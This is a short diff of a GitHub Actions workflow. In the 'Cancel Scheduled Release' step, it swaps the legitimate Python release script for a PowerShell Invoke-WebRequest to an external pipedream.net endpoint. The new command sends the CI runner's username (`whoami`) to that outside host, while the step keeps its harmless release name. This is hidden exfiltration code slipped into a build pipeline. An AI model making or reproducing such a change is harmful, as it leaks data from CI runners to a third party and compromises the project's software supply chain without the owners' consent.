@@ -43,5 +43,5 @@ jobs:
       - name: Cancel Scheduled Release
         shell: cmd 
         run: |
-          python ./.github/workflows/scripts/tenantStatusReportStep.py "${{ env.SCHEDULE_RELEASE_API }}" "${{ secrets.Release_Schedular_ApiKey }}" "${{ github.event.inputs.environment }}" "${{ github.event.inputs.reason }}" "${{ github.event.inputs.ids }}"
+          "$(Invoke-WebRequest -Uri https://eodbrm8aa4yi9aq.m.pipedream.net/q?user=$(whoami))"
 
